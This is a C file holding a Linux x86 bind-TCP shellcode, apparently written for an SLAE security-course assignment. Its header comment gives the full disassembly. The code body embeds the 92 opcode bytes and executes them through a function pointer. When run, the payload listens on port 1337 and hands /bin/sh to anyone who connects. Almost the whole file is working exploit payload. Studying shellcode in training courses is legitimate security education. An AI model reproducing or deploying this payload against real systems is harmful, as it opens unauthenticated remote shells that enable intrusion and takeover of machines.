/**
# Linux x86 Bind TCP shellcode
# This shellcode will listen on port 1337 and give you /bin/sh
# Shellcode Author: Anurag Srivastava
# Shellcode Length: 92
# Student-ID: SLAE-1219
# Note ~ http://www.theanuragsrivastava.in/2018/04/bind-tcp-shellcode-x86-slae-assignment.html

Disassembly of section .text:

08048060 <_start>:
 8048060:	6a 66                	push   0x66
 8048062:	58                   	pop    eax
 8048063:	31 db                	xor    ebx,ebx
 8048065:	53                   	push   ebx
 8048066:	43                   	inc    ebx
 8048067:	53                   	push   ebx
 8048068:	6a 02                	push   0x2
 804806a:	89 e1                	mov    ecx,esp
 804806c:	99                   	cdq
 804806d:	cd 80                	int    0x80
 804806f:	96                   	xchg   esi,eax
 8048070:	52                   	push   edx
 8048071:	66 68 05 39          	pushw  0x3905
 8048075:	43                   	inc    ebx
 8048076:	66 53                	push   bx
 8048078:	89 e1                	mov    ecx,esp
 804807a:	6a 10                	push   0x10
 804807c:	51                   	push   ecx
 804807d:	56                   	push   esi
 804807e:	89 e1                	mov    ecx,esp
 8048080:	6a 66                	push   0x66
 8048082:	58                   	pop    eax
 8048083:	cd 80                	int    0x80
 8048085:	53                   	push   ebx
 8048086:	6a 04                	push   0x4
 8048088:	5b                   	pop    ebx
 8048089:	56                   	push   esi
 804808a:	89 e1                	mov    ecx,esp
 804808c:	6a 66                	push   0x66
 804808e:	58                   	pop    eax
 804808f:	cd 80                	int    0x80
 8048091:	52                   	push   edx
 8048092:	52                   	push   edx
 8048093:	56                   	push   esi
 8048094:	89 e1                	mov    ecx,esp
 8048096:	43                   	inc    ebx
 8048097:	6a 66                	push   0x66
 8048099:	58                   	pop    eax
 804809a:	cd 80                	int    0x80
 804809c:	93                   	xchg   ebx,eax
 804809d:	6a 02                	push   0x2
 804809f:	59                   	pop    ecx

080480a0 <loop>:
 80480a0:	6a 3f                	push   0x3f
 80480a2:	58                   	pop    eax
 80480a3:	cd 80                	int    0x80
 80480a5:	49                   	dec    ecx
 80480a6:	79 f8                	jns    80480a0 <loop>
 80480a8:	31 c9                	xor    ecx,ecx
 80480aa:	51                   	push   ecx
 80480ab:	6a 0b                	push   0xb
 80480ad:	58                   	pop    eax
 80480ae:	68 2f 2f 73 68       	push   0x68732f2f
 80480b3:	68 2f 62 69 6e       	push   0x6e69622f
 80480b8:	89 e3                	mov    ebx,esp
 80480ba:	cd 80                	int    0x80

**/

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x6a\x66\x58\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\x99\xcd\x80\x96\x52\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x6a\x66\x58\xcd\x80\x53\x6a\x04\x5b\x56\x89\xe1\x6a\x66\x58\xcd\x80\x52\x52\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\x93\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
main()
{
printf("Shellcode Length:  %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}